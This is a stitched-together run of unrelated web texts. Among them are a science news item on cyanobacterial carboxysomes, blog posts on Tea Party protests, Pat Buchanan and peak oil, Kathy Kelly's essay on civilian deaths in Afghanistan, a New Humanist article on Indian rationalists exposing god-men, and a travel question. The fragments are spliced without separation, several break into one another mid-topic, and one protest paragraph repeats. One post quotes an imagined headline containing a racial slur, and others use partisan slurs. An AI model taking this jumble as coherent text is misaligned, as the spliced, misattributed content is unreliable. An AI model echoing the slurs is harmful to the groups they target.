The finding adds evidence for new ways to think about bacteria .
" We had this idea of bacteria as a bag of enzymes , but that has been completely shattered , " said Afonso .
A single protein , called parA , acts as a kind of inner- bacterium stage manager , arranging the carboxysomes in a neat , single - file row , the researchers found .
When they disabled the bacteria 's ability to make the protein , the carboxysomes were distributed far more randomly .
The cyanobacteria lacking parA were also less " fit " for survival , said Savage .
While wild - type bacteria cells have a consistent number of carboyxsomes , which in turn optimizes carbon processing and fitness , the knockout bacterium created daughter cells whose numbers of carboxysomes ranged from none to an excess .
The daughter cells with few or no carboxysomes divide more slowly and also process fifty percent less carbon than daughter cells at the other end of the spectrum .
( see video 1 )
Knock - out bacteria , like the ones shown here who lack in parA , are less fit for survival .
While wild - type bacteria cells have a consistent number of carboyxsomes , the knockouts either do n't have enough or have too many , which leads to slower cell division and less carbon processing .
By tagging parA in wild - type bacteria , they discovered interesting dynamics in the protein .
Thousands of parA proteins repeatedly cluster together and shoot quickly from one end of the bacterium to the other .
( see video 2 )
Green tagged parA proteins gather at one side of the bacterium , shoot to the other end as a cluster , then shoot back .
This dynamic seems to be associated with the even spacing of carboxysomes .
" It 's amazing that you can generate this regularity and symmetry potentially from a single protein , " said Savage .
" It 's amazing that it is somehow tuned by the dynamics of the protein . "
The researchers have not yet identified the exact mechanism parA uses to govern the spacing .
Many other bacteria also have the parA protein , which is known for separating chromosomes during cell division .
" This work highlights how bacteria cobble together spare parts to achieve similar goals such as organization and segregation , " said David Rudner , HMS assistant professor of microbiology and molecular genetics , who was not involved in the study .
These findings may help synthetic biologists one day create designer bacteria .
" Knowledge about how cells create and deploy specialized factories like the carboxysome opens the way to creating other kinds of mini factories that could perform useful functions , " said Richard Losick , Harvard University professor of molecular and cellular biology , who was not involved in the study .
Silver 's lab is looking into whether the carboxysome might be useful for optimizing the production of hydrogen by engineered bacteria .
One challenge in designing hydrogen - producing bacteria is that the enzymes that produce hydrogen are sensitive to oxygen .
The carboxysome may help solve this problem because its outer shell blocks out oxygen , protecting the enzymes inside from its toxic effects .

We had an interesting conversation yesterday in comments about this video .
GOP folks and Tea Partiers are increasingly peeved that their movement is being depicted in the media as filled with angry crazies on the verge of violence .
As someone who 's studied protest , and demonstrated a couple of times myself , I think part of the problem is quality control .
I date back to the Million Man March , when there was great concern that the hordes of black men descending on Washington might break out into a riot .
Farrakhan was at the height of his power and the March was a product of the black nationalist wing of the community , not the " safe " civil rights wing .
Indeed , several civil rights leaders , at the time , denounced the March .
I was a student at Howard at the time , and like all the other prospective Marchers , I read the papers and was well - versed in notion of not embarrassing your people in front of white folks .
The last thing any of us wanted to do was to march down to the Mall and have the next day 's headline read , " Niggers Can't Even March Without Fighting . "
In the months leading up to the March , organizers toured the country speaking to black men in the community and pushing the essential conservative aspects of the March .
We had an interesting conversation yesterday in comments about this video .
GOP folks and Tea Partiers are increasingly peeved that their movement is being depicted in the media as filled with angry crazies on the verge of violence .
As someone who 's studied protest , and demonstrated a couple of times myself , I think part of the problem is quality control .
The theme was atonement -- even as we recognized the wickedness of racism , we were going to the Mall to take ownership of our sins , to denounce black on black crime , to denounce absentee fatherhood , and recommit ourselves to the traditional cult of maledom .
The concept of violence , or even boisterous anger , was counter to the March 's goals , and so while there was much surprise at how solemn the event came off , if you 'd been watching from the start , it would have made sense .
I think had someone done something to embarrass us , there really would have been hell to pay .
We thought that media was looking for trouble , but we also thought it was within our power not to give it to them .
I think we got some of that sense from the Civil Rights movement 's choreography .
These guys were the masters of protest as propaganda .
The Montgomery bus boycott was a strategy and Rosa Parks was not some witless old lady , but a civil rights worker who'd been trained to accord herself a certain way .
When Martin Luther King would be arrested he dressed a certain way , he seemed to try to convey to the cameras a kind of solemn restraint .
The marches themselves were choreographed , and the strategy of nonviolence was drilled into anyone who'd protest .
I hear GOP folks and Tea Partiers bemoaning the fact that media and Democrats are using the extremes of their movement for ratings and to score points .
This is like Drew Brees complaining that Dwight Freeney keeps trying to sack him .
If that were Martin Luther King 's response to media coverage , the South might still be segregated .
I exaggerate , but my point is that the whining reflects a basic misunderstanding of the rules of protest .
When you lead a protest you lead it , you own it , and your opponents , and the media , will hold you responsible for whatever happens in the course of that protest .
This is n't left - wing bias , it 's the nature of the threat .
There is of course a deeper question about the limits of strategy .
It 's possible that if the Tea Partiers cleaned up their ranks -- purged the birthers , publicly rebuked people like this guy , banned Hitler signs , loudly rejected any instances of racism -- that they simply would n't have much of a movement left .
Martin Luther King was trying to lead a black community that was demonstrably patriotic , and had , in the main , rejected political violence as a strategy .
He could afford to be picky .
In the case of the Tea Parties , it 's possible that once you subtract the jackasses , you just do n't have enough energy left .
Mervyn King , the Bank of England 's Governor , seems strangely alone in facing the implications of this for central banks , and in seeing the absurdity of a recovery strategy where everybody tightens at once and surplus states keep on dumping excess capacity abroad .
" I was struck by the mood at the G7 , where several of the major economies around the world said quite openly that they were relying on external demand growth to generate growth .
That can't be true of everybody , " he said .
Official websites use .gov
A .gov website belongs to an official government organization in the United States .
A British Navy destroyer has intercepted an Argentinian warship in an apparent escalation of the Falklands Island Oil Crisis , according to The Sun .
The announcement comes just hours after the Argentinians filed a complaint with the United Nations over British oil exploration in the Falklands .
The small group of islands off the coast of Argentina are a British possession that the two had a conflict over in 1982 .
The federal opposition has told free - to - air television networks it intends to block in the Senate a promised $ 250 million reduction in licence fees because it does n't believe the government has adequately explained why it 's needed .
The Sydney Morning Herald says it 's learned that shadow treasurer Joe Hockey told the Seven Network chief executive David Leckie on Friday .
Afterwards , Mr Hockey is understood to have met representatives from the pay - TV industry to hear its concerns .
Pay TV believes too many government decisions , including the $ 250 million fee reduction , are skewed in favour of free - to - air .
Communications Minister Stephen Conroy , who went skiing with Seven Network boss Kerry Stokes in January , was accused on Friday by Opposition Leader Tony Abbott of " doing a special deal " for Mr Stokes .
Mr Hockey said the government kept changing the reasons for the decision .
Senator Conroy questioned Mr Abbott 's secret meeting with News Corporation chairman Rupert Murdoch last weekend .
Buchanan 's latest furball was coughed up about more recent events .
With Teabaggers , Militias , anti-abortion fanatics and other right - wing miscreants making death threats , hurling bigoted abuse , and other hooligan acts , there is understandable alarm among the targets of these cowardly thugs .
However , since it is a mandatory requirement for media figures to be fallacious at best and intellectually dishonest at worst , the Golden Mean Fallacy is trotted out to pooh - pooh the threats and violence .
The one mentally deranged man who threatened a Republican Congressman ( as well as President Obama and others ) is taken as evidence that the Right and Left are equally at fault .
This kind of dishonesty is typical .
Buchanan had to go one better on Morning Joe , a show aired on the " liberal " MSNBC , claiming that the biggest outbreak of anti-government violence was the riots that followed the acquittal of four L.A. policemen who beat Rodney King like a piñata .

First of all , politics had nothing to do with the looting and killing that happened in Los Angeles .
People loot and pillage for fun and / or profit , not to advance a political agenda .
There were protests against police brutality , but there 's no evidence the protesters were the ones sacking and burning Los Angeles and killing fifty - three people .
It is interesting to note that Buchanan chose not to remember the Oklahoma City Bombing that took place fifteen years ago and killed 168 people .
Timothy McVeigh and Terry Nichols blew up the Murrah Building to ( a ) avenge Waco and ( b ) to incite an armed insurrection and race war , as detailed in The Turner Diaries - the playbook McVeigh and Nichols used to form their game plan .
Buchanan also chose to ignore the several abortion doctors who have been hunted down and assassinated by Fetus Christers - including the recent assassination of Dr. George Tiller .
Instead , he wants to bring up the political violence of the 1960s and early 70s .
Again , his memory is selective .
The overwhelming majority of the violence back then was carried out by the pro-war and anti-civil rights crowds , whether it was the Southern racists who blew up churches , lynched blacks and assassinated whites who tried to help them ; or it was the police and National Guard beating and killing anti-war activists .
Maybe Buchanan would prefer NOT to remember the right - wing violence from that era , since he worked for Nixon along with Charles Colson , the man who organized the so - called Hard Hats , a mob of violent thugs who started a riot in New York City , where scores of people were injured :
On May 26 , Brennan led a delegation of 22 union leaders to meet with President Nixon at the White House and presented him with a hard hat .
Nixon general counsel Charles Colson , in charge of developing a strategy to win union support for Nixon in the 1972 presidential election , identified Brennan as a friendly labor leader due to his role in organizing the counter - protests of May 8 and May 20 .
Brennan later met privately with Nixon on Labor Day .
Brennan later organized significant labor union political support for Nixon in the 1972 election .
Nixon appointed Brennan as his Labor Secretary after the election as a reward for his support .
Rick Perlstein describes the period in detail here .
Pat Buchanan 's fondness for racism and fascism is well - documented and well known .
So it 's not surprising to see and hear him cough up this latest furball .
What IS amazing is that none of the other panelists called him on it .
Not one thought of Oklahoma City ?
I find that hard to believe .
They had an agenda and facts were the last thing that would get in their way .

Sometimes really weird cults born , like this one the Sect of Gadget Hackwrench one .
“ She is the divine being , the most untouched and perfect sibling of the great God on Earth ” , say one of the participants .
“ Why I love her ?
It ’s stupid question , how I ca n’t love the Godess ? ” .
“ She is strict , cute , optimistic and her level of technical knowledge is unachievable for a mortal being . ” those are just a few of the testimonies of the sect followers .
And if you did n’t recognize the hero – that ’s a Disney mouse cartoon .
Back in the days when US oil demand controlled the price of oil , a massive recession in the United States would have sent oil to 12.00 dollars a barrel .
That era , which ended last decade , was defined by ongoing spare capacity in OPEC , low - cost oil in Non-OPEC , and nascent demand for oil in the developing world .
That was then , and this is now .
And so it ’s rather quaint that the energy analysts from that previous era still gather each week on American financial TV , to discuss the inventories at Cushing , Oklahoma .
Inventories at Cushing , Oklahoma ?
The US has been removing discretionary demand for oil for years , starting back in 2004 .
And current unemployment in California is at 13.2 % –another new post - war high .
Yet oil is at 82.00 dollars ?
Get these analysts off TV .
Please .
We need analysis of diesel demand in Guangdong , and Uttar Pradesh .
With the closing out of the decade we also have the full data set , on global crude oil production .
As you can see from the chart below , the twin peaks of oil production in 2005 and 2008 reveal that while the world was able to respond to a moderate price advance coming out of 2002 , nearly all of the price action above 40.00 dollars a barrel starting in late 2004 did not produce more supply .
Welcome to peak oil : when the world ’s remaining supply of oil is more diffuse , of lower grade , harder to extract , and is unable to flow in the aggregate at higher production levels .
There is an extra measure of comedy today to our defunct and inward - looking group of oil analysts here in the States , as it was revealed that these weekly measures of US inventories are highly flawed .
Well , actually , we knew that .
But it ’s always nice to get the proof .
From tonight ’s Wall Street Journal :
… documents , obtained through a Freedom of Information Act request , expose several errors in the Energy Information Agency ’s weekly oil report , including one in September that was large enough to cause a jump in oil prices , and a litany of problems with its data collection , including the use of ancient technology and out - of - date methodology , that make it nearly impossible for staff to detect errors …
Internal emails and a report from a consulting firm prepared in September describe a process at the EIA that served the oil world well in 1983 , the first year that oil futures traded , but has n’t kept up as the inventory data have become more influential and the nation ’s oil infrastructure has become more complex .
The familiar names that you see on financial TV here in the US , talking about oil , are generally living in a past that no longer exists .
One really has to go to London , Sydney , and Toronto to find not only the best minds in energy , but TV hosts smart and informed enough to even handle the conversation .
Global oil production peaked in the 2005 - 2008 period and now trades at levels thought unthinkable in 2005 when unemployment levels in the OECD were half current levels , if not lower .
The US no longer controls the geology or oil , or the price of oil .
But , we carry on as though we will again in the future .
After all , in places like California which is seeing a competitive race for the Governorship , phrases like Getting Back on Track are all the rage .

Kathy Kelly on the Obama Administration ’s war crimes in Afghanistan and a ‘ pacified ’ America .
by Kathy Kelly
30 Mar 2010 | truthout
If the U.S. public looked long and hard into a mirror reflecting the civilian atrocities that have occurred in Afghanistan over the past ten months , we would see ourselves as people who have collaborated with and paid for war crimes committed against innocent civilians who meant us no harm .
Two reporters , Jerome Starkey ( Times of London ) and David Lindorff , ( Counterpunch ) , have persistently drawn attention to US war crimes committed in Afghanistan .
Makers of the film “ Rethinking Afghanistan ” have steadily provided updates about the suffering endured by Afghan civilians .
Here is a short list of atrocities that have occurred in the months since Gen.
Stanley McChrystal assumed his post in Afghanistan :
December 26 , 2009 : U.S. - led forces , ( whether soldiers or “ security contractors ” ( mercenaries ) is still uncertain ) , raided a home in Kunar Province and pulled eight young men out of their beds , handcuffed them and gunned them down execution - style .
The Pentagon initially reported that the victims had been running a bomb factory , although distraught villagers were willing to swear that the victims , youngsters aged 11 - 18 , were just seven normal schoolboys and one shepherd boy .
Following courageous reporting by Starkey , the U.S. military carried out its own investigation , and on February 24 , 2010 , issued an apology , attesting to the boys ’ innocence .
February 12 , 2010 : U.S. and Afghan forces raided a home during a party and killed five people , including a local district attorney , a local police commander , two pregnant mothers and a teenage girl engaged to be married .
Neither Commander Dawood , shot in the doorway of his home while pleading for calm waving his badge , nor the teenage Gulalai , died immediately , but the gunmen refused to allow relatives to take them to the hospital .
Instead , they forced them to wait for hours while barefoot in the winter cold outside .
Despite crowds of witnesses on the scene , the NATO report insisted that the two pregnant women at the party had been found bound and gagged , murdered by the male victims in an honor killing .
A March 16 , 2010 , U.N. report , following on further reporting by Starkey , exposed the deception , to meager American press attention .
Two weeks later : February 21 , 2010 : A three - car convoy of Afghans was traveling to the market in Kandahar with plans to proceed from there to a hospital in Kabul where some of the party could be taken for much - needed medical treatment .
US forces saw Afghans traveling together and launched an air - to - ground attack on the first car .
Women in the second car immediately jumped out waving their scarves , trying desperately to communicate that they were civilians .
The U.S. helicopter gunships continued firing on the now unshielded women .
Twenty - one people were killed and 13 were wounded .
There was press attention for this atrocity and General McChrystal would issue a videotaped apology for his soldiers ’ tragic mistake .
Broad consensus among the press accepted this as a gracious gesture , with no consequences for the helicopter crew ever demanded or announced .
Whether having that gunship in the country was a mistake – or a crime – was never raised as a question .
And who would want it raised ?
Set amid the horrors of an ongoing , eight - year war , how many Americans think twice about these atrocities , hearing them on the news ?
So , I ’m baffled to learn that in Germany , a western , relatively comfortable country , citizens raised a sustained protest when their leaders misled them regarding an atrocity that cost many dozens of civilian lives in Afghanistan .
The airstrike was conducted by U.S. planes , but called in by German forces .
On September 4 , 2009 , Taliban fighters in Kunduz Province had hijacked two trucks filled with petrol , but then gotten stuck in a quagmire where the trucks had sank .
Locals , realizing that the trucks carried valuable fuel , had arrived in large numbers to siphon it off , but when a German officer at the nearest NATO station learned that over 100 people had assembled in an area under his supervision , he decided they must be insurgents and a threat to Germans under his command .
At his call , a U.S. fighter jet bombed the tankers , incinerating 142 people , dozens of them confirmable as civilians .
On September 6 , 2009 , Germany ’s Defense Minister at the time Franz Josef Jung held a press conference in which he defended the attack , playing down the presence of civilians .
He was n’t aware that video footage from a U.S. F - 15 fighter jet showed that most of the people present were unarmed civilians gathering to fill containers with fuel .
On November 27 , 2009 , after a steady outcry on the part of the German public , the defense minister was withdrawn from his post , ( he is now a labor minister ) and two German military officials , one of them Germany ’s top military commander Wolfgang Schneiderhan , were forced to resign .
I felt uneasy and sad when I realized that my first response to this story was a feeling of curiosity as to how the public of another country could manage to raise such a furor over deaths of people in faraway Afghanistan .
How odd to have grown up wondering how anyone could ever have been an uninvolved bystander allowing Nazi atrocities to develop and to find myself , four decades later , puzzling over how German people or any country ’s citizenship could exercise so much control over their governance .
Today , in the U.S. , attacks on civilians are frequently discussed in terms of the “ war for hearts and minds . ”
Close to ten months ago , Defense Secretary Robert Gates told reporters at a June 12 , 2009 press conference in Brussels that General McChrystal “ would work to minimize Afghan civilian casualties , a source of growing public anger within Afghanistan . ”
“ Every civilian casualty — however caused — is a defeat for us , ” Gates continued , “ and a setback for the Afghan government . ”
On March 23 , 2010 , General McChrystal was interviewed by the Daily Telegraph .
“ Your security comes from the people , ” he said .
“ You do n’t need to be secured away from the people .
You need to be secured by the people .
So as you win their support , it ’s in their interests to secure you … .
This can mean patrolling without armored vehicles or even flak jackets .
It means accepting greater short - term risk – and higher casualties – in the hope of winning a ‘ battle of perceptions and perspectives ’ that will result in longer - term security . ”
And on March 2 , 2010 , he told Gail McCabe , “ What we ’re trying to do now is to increase their confidence in us and their confidence in their government .
But you ca n’t do that through smoke and mirrors , you have to do that through real things you do – because they ’ve been through thirty - one years of war now , they ’ve seen so much , they ’re not going to be beguiled by a message . ”
We ’re obliged as Americans to ask ourselves whether we will be guided by a message such as General McChrystal ’s or by evidence .
Americans have not been through 31 years of war , and we have managed to see very little of the consequences of decades of war making in Afghanistan .
According to a March 3 , 2010 , Save the Children report , “ The world is ignoring the daily deaths of more than 850 Afghan children from treatable diseases like diarrhea and pneumonia , focusing on fighting the insurgency rather than providing humanitarian aid . ”
The report noted that a quarter of all children born in the country die before the age of five , while nearly 60 percent of children are malnourished and suffer physical or mental problems .
The U.N. Human Development Index in 2009 said that Afghanistan is one of the poorest countries in the world , second only to Niger in sub-Saharan Africa .
The proposed U.S. defense budget will cost the U.S. public two billion dollars per day .
President Obama ’s administration is seeking a $ 33 billion supplemental to fund wars in Iraq and Afghanistan .
Most U.S. people are aware of Taliban atrocities and many may believe the U.S. troops are in Afghanistan to protect Afghan villagers from Taliban human rights abuses .
At least the mainstream news media in Germany and the U.K. will air stories of atrocities .
The U.S. people are disadvantaged inasmuch as the media and the Pentagon attempt to pacify us , winning our hearts and minds to bankroll ongoing warfare and troop escalation in Afghanistan .
Yet , it is n’t very difficult to pacify U.S. people .
We ’re easily distracted from the war , and when we do note that an atrocity has happened , we seem more likely to respond with a shrug of dismay than with a sustained protest .
At the Winter Soldier hearings , future presidential hopeful John Kerry movingly asked Congress how it could ask a soldier “ To be the last man to die for a mistake , ” while contemporary polls showed less prominent Americans far more willing to call the Vietnam War evil — a crime , a sin — than “ a mistake . ”
The purpose of that war , as with Obama ’s favored war in Afghanistan , was to pacify dangerous populations – to make them peaceful , to win the battle of hearts and minds .
Afghan civilian deaths no longer occur at the rate seen in the war ’s first few months , in which the civilian toll of our 9/11 attacks , pretext for the war then as it is now , was so rapidly exceeded .
But every week we hear — if we are listening very carefully to the news , if we are still reading that final paragraph on page A16 , or if we are following the work of brave souls like Starkey — of tragic mistakes .
We are used to tragic mistakes .
Attacking a country militarily means planning for countless tragic mistakes .
Some of us still let ourselves believe that the war can do some good in Afghanistan , that our leaders ’ motives for escalating the war , however dominated by strategic economic concerns and geopolitical rivalries , still in some small part include the interests of the Afghan people .
There are others who know where this war will lead and know that our leaders know and have simply become too fatigued , too drained of frightened tears by this long decade of nightmare , to hold those leaders accountable anymore for moral choices .
It ’s worthwhile to wonder , how did we become this pacified ?
But far more important is our collective effort to approach the mirror , to stay in front of it , unflinching , and see the consequences of our mistaken acquiescence to the tragic mistakes of war , and then work , work hard , to correct our mistakes and nonviolently resist collaboration with war crimes .

While this could just mean some standard kevlar , we agree with our friends over at Slate 's Explainer that it 's much more fun to hypothesize an actual bullet - resistant suit , tailored to Obama 's exacting standards .
Slate points to the wares engineered by the intrepid Miguel Caballero - the Colombian designer known for dressing international journalists in his anti-assasination fashions and then firing guns at them .

( New Humanist Volume 120 Issue 6 November / December 2005 )
In 2000 journalist Ritu Sehgal witnessed a modern miracle in the northern Indian state of Uttar Pradesh .
This is how she set the scene : " It is a sleepy Sunday afternoon in Makkanpur , Old men sit in front ofshop in the shadow of the Neem tree playing cards and drinking tea .
Suddenly they raise their heads .
Two unusual guests approach ....
Clad in saffron robes , a sadhu comes nearer , followed by his disciple .
Barefoot through the mud the holy man and his companion move with measured steps .
The sadhu lifts his hand for a blessing and enters the premises of the sarpanch 's ( village head 's ) house .
Some young men run and bring a charpoi ( traditional bed ) and place it in the middle of the courtyard .
The holy man sits and folds his legs ceremoniously .
Eyes fixed in the clear blue afternoon sky , he does not move .
The news of the sadhu's arrival spreads fast ....
Within minutes the whole village is present .
All eyes are fixed on the holy man .
The sadhu rises .
Through his disciple he lets the villagers know that a curse is lying on Makkanpur .
He makes them see the bad omen with their own eyes .
He throws a coconut on the stony ground : it breaks , blood squirting out and splashing all around .
The audience is awestruck .
He has come here , the sadhu lets them know , to use his magical powers to free them from threatening disaster and misfortune .
" What follows is an extraordinary display of those supernatural power : the holy man causes a pot to burst into flame and produces eleven lemons from his mouth .
He pierces his cheek without drawing blood , reclines on a bed of nails , and appears to levitate under a sheet .
The crowd are enraptured .
Having proven his power he can now be relied on to cure the town of its curse .
It 's all too easy to be seduced by this portrait of the mystical East , to assume that its rich spiritual heritage brings a meaning and beauty to life so lacking in the materialist , sceptical west .
Attracted by the notion of gurus , sadhus , babas and tan - tricks roaming the land , selflessly curing the masses of affliction , politicians and film stars flock to receive blessings from super - gurus like Sri Sathya Sai Baba .
But on this occasion , witnesses a rather different kind of miracle .
Just as the performance is reaching its climax , with the sadhu hovering above the ground , a man leaps up from the crowd and shouts " Stop !
This is no holy man " .
He tears down the sheet under which the guru is ' flying ' , to reveal the two hockey sticks he is using to raise it .
" We are rationalists " declares the intruder , Sanal Edamaruku , secretary general of the Indian Rationalist Association .
" We have come here to show you how sadhus and god - men are using simple tricks to cheat you . "
The sadhu himself is divested of wig and beard and revealed as a completely ungodly rationalist volunteer .
He 's no guru – just very skilled at conjuring , and well - schooled in the basic chemistry which dictates that certain fluids will ignite on contact , that lit camphor wo n't burn the skin , that weight evenly distributed on nails wo n't puncture .
The miracle is that the spell has been broken .
Once the crowd have absorbed the shock , and broken into laughter , this poor , remote village has been liberated from superstition .
Perhaps for ever .
As Edamaruku says " what may look like Sundayfor children , is in fact nothing less than breaking the little hook on which the god - men 's enormous power , and the fate of their victims , hangs .
" Despite a tenacious western orientalism which overemphasises and overvalues Indian religiosity , reinforced by the homegrown ' Hindutva ' movement propagated by the BJP , India has a long and distinguished rationalist tradition which is considerably older than that of the west .
According to Nobel prize - winning economist Amartya Sen , the seeds of rationalism were planted many thousands of years before the Enlightenment , and centuries before Jesus Christ .
himself , or at least Siddharta ( who may or may not have been the first ) , could lay claim to being the first rationalist , and even the Hindu sacred text the Ramayana contains the character of Javali who advises the god-king Ram that " there is no after - world , nor any religious practice for attaining that …[ religious ] injunction have been laid down in the [ scriptures ] by clever people just to rule over [ other ] people . "
This tradition also includes practical political rationalism such as that of Buddhist Emporer Ashoka ( 273 - 232 BC ) who declared religious tolerance and equal human rights with the aim of unifying all India .
Contemporary groups like Edamaruku's Delhi - based Indian Rationalist Association ( IRA ) and the Satya Shodhak Sabha ( Society of Truth Seekers ) based in Gujarat , are direct descendents of this tradition .
More immediately , they build on the work of the founding fathers of modern Indian rationalism : Mahatma Phule ( 1827-1890 ) , Periyar Ramasami ( 1879 -1973 ) and Gora ( 1902 - 1975 ) .
Phule , son of a vegetable vendor and educated through the philanthropy of family friends , was one of India 's most influential social reformers , campaigning against the caste system , the subordination of woman and the invested power of the Brahmin .
Periyar , the ' of South India ' , was born in Tamil Nadu to an affluent religious family and made his name publicly challenging religionists .
Drawing inspiration from the French revolution , he loudly and publicly attacked religion as superstition and exploitation .
He was a powerful orator and fearless critic : " It gives me extraordinary pleasure " , he wrote , " to fling at the pundits their own contradictions , and thus perplex them .
" Gora was a high caste Hindu who became a global symbol for ' positive atheism ' as well as a tireless campaigner for human rights , and alongside Gandhi , a protester against colonial rule and godfather of democratic India .
Phule , Periyar and Gora can be credited with taking the principles of Indian scepticism , rationalism and humanism to a mass audience , though they rarely appear on western lists of rationalist heroes .
Building on this pioneering work it was the Sri Lankan based rationalist Abraham Kovoor ( 1898 - 1978 ) , who innovated and extended the techniques of miracle exposure .
Kovoor , the son of a vicar , was a professor of Botany , but it was after retirement that he really made his mark as a campaigner against god-men and supernatural fraud .
He travelled widely and wrote copiously , bringing all his scientific training and rhetorical power to bear on the practices of the shaman and supposed magicians .
He undertook four ' miracle exposure ' tours of India in the early 1970s , organised by the IRA and Sanal 's father Joseph Edamaruku , even visiting the ashram of Sai Baba , one of Indian 's most prominent and popular holy men who , despite his claims to be a god on earth , was unwilling to meet the professor to prove his supernatural powers .
After Kovoor 's death in 1978 his mantle was taken up by Basava Premanand ( born 1930 ) .
Premanand , probably the most box - office of the miracle exposers , actually started out as a disciple of Sai Baba .
Becoming disillusioned in 1975 ( having transferred a lot of his property to the guru ) , and inspired by Kavoor , he devoted himself to exposing Baba 's use of ( pretty amateurish ) prestidigitation to produce ' holy ash ' and the cheap trinkets with which he wows his large , and far from exclusively Indian , gaggle of devotees .
It was Kovoor 's visit to Gujarat in 1976 which inspired a group of rationalists there to form Satya Shodhal Sabha ( SSS ) , named after Mahatma Phule 's original 1870s organisation .
Kavoor 's demonstrations convinced a new generation of activists – composed , like most of India 's activist - rationalists , of volunteers from the ranks of education and academia spiced with disillusioned former - converts – that public demonstrations and exposures were the most effective way of educating the public and undermining the credibility and the power of exploitative faith healers , sadhu and the ragholy men who tour the country exploiting ignorance and fear where they find it .
Exposures are part of a sophisticated strategy to influence popular opinion against supernaturalism .
"
We do not go out and talk about whether God exists or not , or get involved in abstract disputes of that nature , " says Professor BD Desai , secretary of the SSS , who have performed over 1500 miracle exposures since 1982 .
" We are not concerned with showing how clever we are compared to the ignorant masses .
We want to talk to people in a language they understand , to expose falsehood and contradictions , and show how the miracles are basically a ploy to distract and misguide people from their genuine problems .
" The SSS work on a number of fronts simultaneously .
In addition to exposing the fakery of fakirs , they work as a semi-official abuse monitoring service , helping to identify , expose and prosecute sadhus involved in sexual exploitation .
" In India male children are highly valued .
If a woman cannot conceive a male she will often seek out the help of a sadhu , who claims that using ritual and sacrifice he can heal her .
Often such situations end up in rape or sexual abuse .
A complaint will be made to us , we will send undercover volunteers to investigate and gather evidence , and if possible go to court to help secure a conviction . "
In this they are fully supported by the local police and receive a degree of state support .
Then there are the cases of supernaturalism which do not involve shifty sadhus , but more complex and fascinating psychological motives than mere greed .
Professor Desai relates the story of a 14 year - old boy in the remote sea side village of Kantiyazad , who was believed to have been possessed by the avatar ( spirit ) of the god Jalaram Bapa – how else to explain the fact that he had begun intoning verse in Sanskrit , a language he did not know ?
When rationalist investigators arrived they discovered that the boy , neglected in favour of twoolder brothers , had memorised the verses , which were pasted up in his father 's shrine .
The apparent possession was an attempt to gain the attention and approval of his father .
Or how about the strange appearance of cuts in a young wife 's sari every time she was due to leave the house with her husband ?
On closer inspection , the evil omen turned out to be the result of some nifty scissor work by a frustrated sister - in - law confined to the house .
In both cases the investigators made a point not to expose the fraudsters in public , but to work with the families to achieve some kind of settlement which would remove the motive for the false possession .
Each case reveals the deep connection between India 's structural inequality – the caste system , gender subordination – and the lure of supernaturalism , the desire to be heard , to escape or to grasp some approximation of meaning apparently offered by the holy - rollers .
The crucial skill of the Indian rationalist tacticians is to be able to combine a sense of theatre comparable to that of the most extravagant sadhu , with a recognition of the link between India 's social inequalities and superstition .
Desire for social transformation , in the west more associated with radicalpolitics , goes hand in hand with the desire to expose fraud .
Tactically astute , organisations like the SSS know that miracle exposures , successful as they are , will not of themselves transform Indian social inequality , but they form the conspicuous surface of an underlying strategy : " We are wedded to social change , but to create acceptability we need to make inroads in the thinking of the people .
Exposures achieve this , as does our voluntary work of all kinds .
We have exposed over 50 frauds , and many mid-level gurus have left , but our focus is on the people .
First and last we want people to think rationally .
Once that happens the gurus will not remain anywhere .
" Professor Desai is clear that while the forms of Indian activism can be an inspiration for a renewed practical western rationalist project , western traditions of rationalist and humanist thought remain an essential model for India : " Our entire enlightenment depends on the west , and we have a lot more to learn . "
In his speech at the conference in 1999 which celebrated 100 years of the Rationalist Press Association ( RPA ) , Sanal Edamaruku was explicit about the vital role played by the availability of cheap copies of classic western humanist texts , printed by the RPA , publishers of the journal you are reading now : " The Cheap Reprints and the Thinkers ' Library series during the middle of the 20th century reached far - off places and provoked thinking people to come out and plan organised efforts to influence change . "
One of the most influential successes of Indian atheist publishers was to translate much of the Thinker 's Library , and many other classics of humanism , into local languages like Malayalam .
" If you happen to come to Kerala one day , " Edamaruku concludes " do n't be too astonished to meet a teashop boy who has read Charles Darwin 's Origin of Species . "
The influence , in the end , is two - way .
Indian rationalism continues to claim some significant victories : exposing not only dozens of home - grown charlatans but also imported varieties such as evangelical fraudster Morris Cerullo and faith healing huckster Clive Harris ; ensuring that astrology was deprived of the status as a legitimate profession and preventing it from being adopted on the university curriculum ; and securing the right to register ' no caste or religion ' on official forms , are just some of the practical achievements they can claim .
But neither Desai nor Edamaruku are complacent about the challenges still to come .
To the problems of illiteracy , superstition and sectarianism are added the renewed perils of Islamic fundamentalism and the machinations of imported Christian missionaries .
For the rationalists , the work goes on .
Professor Desai , since retirement working harder than ever for the cause , continues to lecture , speak and write ( his organisation has published scores of books and pamphlets in Gujarati ) as well as appearing as a material witness in abuse cases .
Edamaruku runs the IRA with tireless enthusiasm , using all media – TV , the Internet , magazines , public speaking – to get the message out .
From exposing ' the prime minister 's astrologer ' Lachman Das Madan on live TV to running his paranormal investigation centre which exposes contemporary hoaxes such as the photograph of theskeleton , reputed to be a Rakshasa ( mythical ) , in fact revealed as a fairly clumsy piece of photo trickery , Sanal Edamaruku is probably the hardest working man in the miracle - busting business .
His most recent success was on live television across the subcontinent .
On October 20th Indians were glued to their TVs watching live as Astrologist Punjilal , who had predicted that he would die between 3 and 4 pm on that day , lay down to his fate .
Edamaruku had appeared on the 10 o'clock news the night before , confidently predicting that nothing would happen .
By the time the astrologist gingerly arose at five past four , and was declared in perfect health by a doctor , Edamaruku had struck another , very public , blow to the credibility of supernaturalism ( a feat he repeated with even more drama in 2008 ) .
These activists and many others with the same dedication to truth and ability to capture the imagination of the crowd , offer perhaps the best example of how rationalism can be both profound and entertaining .
Perhaps , if they have time , some of these practical rationalists might find time to come over to Britain and help us with our superstition issues .
Problem Statement :
My sister - in - law is having her first kid at the end of May / beginning of June .
She lives in Seattle , and we live in Atlanta , and it ’s important to the family that we ’re there as soon as there ’s a sign she ’s really going to have the kid .
So , any advice on finding a decently priced ticket when we get that call ?
I ’m used to using kayak , farecast , etc for planning trips , but only once have I bought a ticket for somewhere and left immediately .
Possible Solutions :
1. By Wcalvert
This is the hardest type of air ticket to buy for .
It depends on two things :
How much heads up you have and if those flights still have lots of available seats .
If you do n’t have 10 days worth of heads up , then you are n’t going to get any sort of real discount fare .
Kiss anything under $ 500 / person goodbye .
It sounds like you are going to get boned no matter what .
To save the most amount of cash , you are going to need to be willing to drive .
I did a search for Atl ->
Sea for tomorrow through Friday , and the cheapest fare on Kayak is $ 988 on US Air ( with the return in first class ) or $ 1256 on Delta non-stop .
